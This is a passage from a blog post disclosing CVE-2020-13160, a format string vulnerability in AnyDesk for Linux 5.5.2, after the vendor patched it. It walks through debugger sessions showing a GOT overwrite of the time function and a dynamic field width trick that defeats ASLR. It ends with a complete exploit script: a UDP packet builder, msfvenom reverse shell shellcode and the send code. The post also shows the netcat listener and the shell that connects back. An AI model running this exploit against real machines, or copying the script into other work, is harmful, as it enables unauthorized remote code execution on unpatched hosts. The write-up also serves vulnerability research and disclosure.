As you may remember, the vulnerable call to `vsnprintf` is actually made twice for the very same format string. Though it turned out that the call path for both of these calls vary. Because of this also the stack layout varies. This means that an argument selector (e.g. `%26$ln`) on the first call will not reference the same value on the second call. We also need to keep in mind that we cannot change the format string in-between the two calls. If we e.g. use `%200$n` on the first call, to write the `GOT` address on the stack, we need to ensure that `%200$n` on the second call also references a writable address, because we trigger a segmentation fault otherwise. This is not only true for `%n` we use to store the `GOT` address but also for the second `%n`, we need to use in order to actually write to the `GOT` entry. Unfortunately there did not seem to be any values on the stack, which would fulfill these requirements.

Thus we need another approach. The first thing that came into my mind was to send two independent announcement frames. We need to trigger the vulnerability twice, so let’s just trigger it twice via the initial attack vector. Because of the duplicate call this actually results in four calls to `vsnprintf`. We still must ensure that the `%n` used on the respective first call also references a writable memory location on the associated second call, but since we only need to use one `%n` format specifier in each pair of calls, stack values can be found to fulfill this requirement.

Although the approach using two separate announcement frames seemed to work, I did not really like it. One reason for this is the duplicate call of `vsnprintf`. We must accept that the second call writes somewhere into memory even though it is not relevant for our exploit. Also the two announcement frames may interfere with legitimate announcement frames, which are sent in the same time window (the GUI gets updated only every 5 seconds). These aspects may reduce the reliability of the exploit.

While thinking about this and looking at the GUI another idea came into my mind:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_02.png)

The GUI displays not only the hostname, but also the username. So far we triggered the vulnerability only by using the hostname. But the username should also be prone to this. Let’s verify this by sending the following announcement frame:

```

p = gen_discover_packet(4919, 1, '\x85\xfeHOSTNAME %p', '\x85\xfeUSERNAME %p', 'ad', 'main')

```

After a few seconds the GUI updates and the breakpoint on the `vsnprintf` call is hit:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 47: Invalid UTF-8 encoded text in name - not valid '\205\376USERNAME %p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010

```

Inspecting the format string (third parameter) we can see that the username indeed triggered the vulnerability. After continuing the execution the breakpoint is hit again:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 47: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010

```

This time the vulnerability was triggered by the hostname. If we further continue the execution both calls (for username and hostname) are repeated.

Thus we verified that the vulnerability can be triggered using both the hostname and the username. This is a good news for our exploit because we can now use two independent format strings, which are sent in a single UDP packet and are both evaluated before the duplicate call is triggered.

What we have to do now is to find an accessible stack address, which we will write the `GOT` address to. For this we must keep in mind that the values on the stack between the two `vsnprintf` calls may change / get overwritten. If we write to an stack address, which is too near to the top of the stack, it is very likely that it has been overwritten at the time of the second call. Finding a suitable value is only a matter of try and error. We write to an address on the first call and then verify that the value we wrote is still the same on the second call.

The stack address `0x7ffffffebe70`, which can be accessed using the argument selector `%93$ln` fits our needs:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376USERNAME %93$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0016| 0x7ffffffeab00 --> 0x171f0c0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138b230 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1715ca0 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 2, 0x00000000008ab346 in ?? ()
gdb-peda$ telescope 0x00007ffffffeb970 100
...
0704| 0x7ffffffebc30 --> 0x7ffffffebe70 --> 0x6ffffec070
...

```

After the first call the value `0x90` (the characters written so far) is written to `0x7ffffffebe70`:

```

gdb-peda$ ni
...
[-------------------------------------code-------------------------------------]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
   0x8ab346:	call   0x412d90 <vsnprintf@plt>
=> 0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
   0x8ab35c:	call   0x4123d0 <gettimeofday@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0016| 0x7ffffffeab00 --> 0x171f0c0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138b230 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1715ca0 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000008ab34b in ?? ()
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000000000000090

```

When the breakpoint is hit again on the second call, the value is still the same:

```

gdb-peda$ c
Continuing.
...
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %165$p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2249 ('I"')
0008| 0x7ffffffeaaf8 --> 0x2bc
0016| 0x7ffffffeab00 --> 0x158c710 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbad94
0032| 0x7ffffffeab10 --> 0x5ecbad94
0040| 0x7ffffffeab18 --> 0xab240
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000000000000090

```

On the second call we can access the value using the argument selector `%165$p` (offset `1280`):

```

gdb-peda$ telescope 0x00007ffffffeb970 200
...
1280| 0x7ffffffebe70 --> 0x90
...

```
## Controlling the instruction pointer

Now we are finally ready to overwrite the `GOT` entry of `time`. At first let’s determine the address of the `GOT` entry:

```

gdb-peda$ p/x &'time@got.plt'
$1 = 0x119ddc0

```

Accordingly the `GOT` entry of `time` is stored at `0x119ddc0`. In order to write this value, we can pad the output of `vsnprintf` accordingly using a `field width`. If you are not familiar with this, please refer to my writeup on [RPISEC/MBE lab04B](https://devel0pment.de/?p=351#lab4B). The error message itself (`Failed to set text from markup ...`) contains 133 characters. Also we need to add two characters for an invalid UTF-8 sequence. Thus we have to pad the output to `18472249` characters:

```

0x119ddc0 = 18472384 (time GOT)
18472384 - 133 - 2 = 18472249

```

Let’s verify this by sending the following announcement frame:

```

p = gen_discover_packet(4919, 1, '\x85\xfeHOSTNAME %165$p', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After the first call to `vsnprintf` the target stack address (`0x7ffffffebe70`) actually contains the `GOT` address of `time`:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 52: Invalid UTF-8 encoded text in name - not valid '\205\376%18472249x%93$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
...
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000006ffffec070
gdb-peda$ ni
...
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x000000000119ddc0

```

The `%165$p` format specifier on the second call successfully references the `GOT` address:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %165$p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
...
gdb-peda$ ni
gdb-peda$ x/s 0x7ffffffeafd0
0x7ffffffeafd0:	"Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME 0x119ddc0'"

```

The next step is to replace the `%p` format specifier with `%ln` in order to write a 8 byte value to the `GOT` entry on the second call. This way we should be able to control the instruction pointer, when the call to `time` is triggered after the `vsnprintf` call. Let’s verify this by writing the value `0x1337`:

```

0x1337 = 4919
4919 - 133 - 2 = 4784

```

This time we adjust the hostname accordingly:

```

p = gen_discover_packet(4919, 1, '\x85\xfe%4784x%165$ln', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After sending the frame and continuing to the second call to `vsnprintf`, to `GOT` entry of `time` is still untouched:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2743 ("C'")
0008| 0x7ffffffeaaf8 --> 0x357
0016| 0x7ffffffeab00 --> 0x158cf10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbb8cc
0032| 0x7ffffffeab10 --> 0x5ecbb8cc
0040| 0x7ffffffeab18 --> 0xd0f51
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00007ffff7ffb930

```

By executing the `vsnprintf` call the value `0x1337` is successfully written:

```

gdb-peda$ ni
...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x0000000000001337

```

If we now continue the execution, the immediately following call to `time` raises a segmentation fault with the instruction pointer being `0x1337`:

```

gdb-peda$ c
Continuing.

Thread 1 "anydesk" received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x1338
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x0
RDX: 0x0
RSI: 0x7ffff1784ca0 --> 0x16c1400 --> 0x276e00 ('')
RDI: 0x7ffffffeab08 --> 0x5ecbb8cc
RBP: 0x5
RSP: 0x7ffffffeaae8 --> 0x8ab355 (lea    rdi,[rsp+0x20])
RIP: 0x1337
R8 : 0x1
R9 : 0x6e ('n')
R10: 0x1
R11: 0xa ('\n')
R12: 0x7ffffffeb898 --> 0x3000000018
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1453ea0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
R15: 0x4
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x1337
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaae8 --> 0x8ab355 (lea    rdi,[rsp+0x20])
0008| 0x7ffffffeaaf0 --> 0x2743 ("C'")
0016| 0x7ffffffeaaf8 --> 0x357
0024| 0x7ffffffeab00 --> 0x158cf10 --> 0x0
0032| 0x7ffffffeab08 --> 0x5ecbb8cc
0040| 0x7ffffffeab10 --> 0x5ecbb8cc
0048| 0x7ffffffeab18 --> 0xd0f51
0056| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000001337 in ?? ()

```

We successfully control the instruction pointer.

## Hitting our shellcode: dynamic field width

At next we must decide where we want to point the instruction pointer to. At the very beginning we figured out, that the security mechanisms of the binary are quite weak. Actually the heap, where the format string we control is stored, is executable:

```

gdb-peda$ vmmap 0x1453ea0
Start              End                Perm	Name
0x011c4000         0x017c8000         rwxp	[heap]

```

This means that we can store a shellcode within the format string and redirect the instruction pointer to this shellcode. Though we need to keep in mind that we manually disabled ASLR and in fact don’t know any heap address. A common approach to bypass ALSR is to leak a memory address. Especially for basic format string vulnerabilities this is an easy to achieve goal. In this case however we don’t get any response from the application. The result of the format string is written to the log file, which we don’t have access to. Thus we cannot leak any heap address.

Nevertheless we can successfully bypass ASLR using a `dynamic field width`. Since this does not seem to be very well-known, let’s have a look at a short example. We have already used the ordinary `field width` in order to pad the output effectively increasing the amount of characters written, which makes `%n` write a bigger value:

```

user@w00d:~$ cat sample1.c
#include <stdio.h>

int main() {

  int out;
  printf("%100x%1$n", &out);
  printf("\nout = %d\n", out);

  return 0;
}

```

The `%100x` format specifier prints the first argument as a hexadecimal number, which is padded to 100 characters. Accordingly 100 characters are written. This amount will be written to the `out` variable by using the `%1$n` format specifier:

```

user@w00d:~$ ./sample1
                                                                                            ffffded4
out = 100

```

In this case the `field width` was statically set to `100`. But we can also use a `dynamic field width`:

```

user@w00d:~$ cat sample2.c
#include <stdio.h>

int main() {

  int out;
  int field_width = 123;
  printf("%1$*2$x%1$n", &out, field_width);
  printf("\nout = %d\n", out);

  return 0;
}

```

We introduced a new variable called `field_width`, which is passed as the second argument to `printf`. Also we changed the `%100x` format specifier to `%1$*2$x`. At first the syntax might look a little bit confusing, but actually it is quite simple: The `1$` at the beginning determines, which value we want to print. In this case we just take the first argument, just like the `%100x` did (4 byte of `out` address). This is separated by an asterisk (`*`) from the second part: `2$`. This determines which value should be used for the field width. In this case the variable `field_width`, which is the second argument. Accordingly when running the program the value of `field_width` (`123`) is written to the variable `out`:

```

user@w00d:~$ ./sample2
                                                                                                                   ffffded0
out = 123

```

After this short introduction to the dynamic field width, let’s see how we can leverage this feature.

When inspecting all accessible parameters on the second call to `vsnprintf` (hostname), we can see that we can access the heap address of the format string. The `reg_save_area` is stored at `0x00007ffffffeb8b0`. The value of `gp_offset` is `0x10`, which means the first argument we can access is stored at `0x00007ffffffeb8b0 + 0x10 = 0x00007ffffffeb8c0`:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x28e3
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffffa7
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1412190 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x28e3
0008| 0x7ffffffeaaf8 --> 0x1e6
0016| 0x7ffffffeab00 --> 0x158bf10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbbcb0
0032| 0x7ffffffeab10 --> 0x5ecbbcb0
0040| 0x7ffffffeab18 --> 0x76cd1
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ x/2xw 0x7ffffffeb898
0x7ffffffeb898:	0x00000010	0x00000030
gdb-peda$ x/2xg 0x7ffffffeb898+8
0x7ffffffeb8a0:	0x00007ffffffeb970	0x00007ffffffeb8b0
gdb-peda$ x/4xg 0x00007ffffffeb8b0+0x10
0x7ffffffeb8c0:	0x0000000001412190	0x0000000000000000
0x7ffffffeb8d0:	0x00007ffff1784c40	0x0000000000000010

```

The first accessible argument at `0x00007ffffffeb8c0` is actually the heap address of the format string (`0x0000000001412190`). If we use this address as a `dynamic field width`, we can actually write its value to the `time` `GOT` entry.

By changing the hostname to the following value, we write the heap address + the amounts of characters written so far (error message and two bytes invalid UTF-8 sequence) to the `time` `GOT` entry:

```

p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%165$ln', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After sending the frame we continue to the second call. The `GOT` entry is still untouched:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x2db9
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0x21 ('!')
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1570630 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2db9
0008| 0x7ffffffeaaf8 --> 0x9d
0016| 0x7ffffffeab00 --> 0x158df10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbc775
0032| 0x7ffffffeab10 --> 0x5ecbc775
0040| 0x7ffffffeab18 --> 0x26709
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00007ffff7ffb930

```

After executing the call the `GOT` entry contains the heap address `0x00000000015706b7`:

```

gdb-peda$ ni
...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00000000015706b7

```

The `%n` wrote the field width (the heap address of the format string `0x1570630`) + the characters written so far. The resulting address (`0x00000000015706b7`) references the beginning of our format specifier:

```

gdb-peda$ x/s 0x00000000015706b7
0x15706b7:	"%1$*1$x%165$ln'"

```

Since we want to make the address point to actual shellcode, which we can append to the format string, we further need to add a little bit of padding. The following hostname adds another `18` characters of padding (`%18x`) and a dummy shellcode (`0xcc`):

```

shellcode = '\xcc'
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

Now the `GOT` entry is overwritten with the address of the shellcode:

```

...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x0000000001379549

gdb-peda$ x/i 0x0000000001379549
   0x1379549:	int3

```
## Final exploit

Finally it is time to generate a real payload:

```

kali@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
...

```

Please notice the bad bytes. `0x00` is excluded to prevent the string from being terminated. `0x25` (`%`) would introduce another format specifier and `0x26` (`&`) is used by glib and must also be avoided.

The final exploit script looks like this:

```

#!/usr/bin/env python

import struct
import socket
import sys

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x59\x88\xc6"
shellcode += b"\x9c\x5f\xfe\x71\x38\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x33\xa1\x9e\x05\x35"
shellcode += b"\xfc\x2e\x52\x58\xd6\xc9\x99\x17\x69\x39\x81"
shellcode += b"\x5b\x88\xd7\xc0\x20\xfe\x71\x39\x08\xc0\x4f"
shellcode += b"\x7a\x35\xee\x2b\x52\x73\xd0\xc9\x99\x35\xfd"
shellcode += b"\x2f\x70\xa6\x46\xac\xbd\x07\xf1\x74\x4d\xaf"
shellcode += b"\xe2\xfd\xc4\xc6\xb6\xca\x17\x3b\xe1\xa8\xb3"
shellcode += b"\x2c\x96\x71\x6b\x11\x01\x21\xce\x08\xb6\xf8"
shellcode += b"\xde\x56\x8d\xc6\x9c\x5f\xfe\x71\x38"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')

```

Before running the exploit we start a `nc` listener on port 4444:

```

user@w00d:~$ nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)

```

Now we run the exploit script:

```

user@w00d:~$ ./final_exploit.py
sending payload ...
reverse shell should connect within 5 seconds

```

After a few seconds the front-end updates its online states, which triggers the exploit. The shellcode is executed and we receive a reverse shell:

```

...
Connection from localhost 52000 received!
id
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)

```
# Conclusion

By sending a single UDP packet to the target machine we are able to successfully exploit the discovered format string vulnerability to gain Remote Code Execution. In order to achieve this we triggered the vulnerability twice: once to write the address of the `GOT` entry of the `time` function to the stack and a second time to write the heap address of our shellcode to the `GOT` entry using a `dynamic field width`.

Please keep in mind that this is a proof of concept exploit targeting AnyDesk Linux version `5.5.2`. The exploit was developed for `Ubuntu 18.04.4 LTS` at the time of writing. In order to successfully run the exploit against other targets it probably needs to be adjusted.

At last I would like to thank AnyDesk for the immediate and professional reaction. A patch to fix the vulnerability was released only three days after my notification. Also the patch enabled `FULL RELRO` according to my suggestion. This remaps the `GOT` as read-only preventing an attacker from overwriting an entry within the `GOT`.

It is great to see when security is taken seriously.

Thanks for reading the article 🙂

**Timeline**
18/02/20 – Vendor Notification
19/02/20 – Vendor Acknowledgement
21/02/20 – Vendor Patch
09/06/20 – Public Disclosure

 Post Views: 50,562

  Categories[article](https://devel0pment.de/?cat=29)  Tags[CVE-2020-13160](https://devel0pment.de/?tag=cve-2020-13160), [exploitation](https://devel0pment.de/?tag=exploitation), [formatstring](https://devel0pment.de/?tag=formatstring), [fuzzing](https://devel0pment.de/?tag=fuzzing), [rce](https://devel0pment.de/?tag=rce)

## 9 Replies to “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”

1. ![](https://secure.gravatar.com/avatar/e82a050707aeed85933f04f71f9971fd?s=100&d=mm&r=g)
   [24. November 2020 at 4:31 pm](https://devel0pment.de/?p=1881#comment-2625)

   Do you by any chance know where I can find a document that details AnyDesk file format

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g)
      [24. November 2020 at 4:56 pm](https://devel0pment.de/?p=1881#comment-2626)

      No, sorry. I am not aware of any documentation. Probably there isn’t any publicly available.
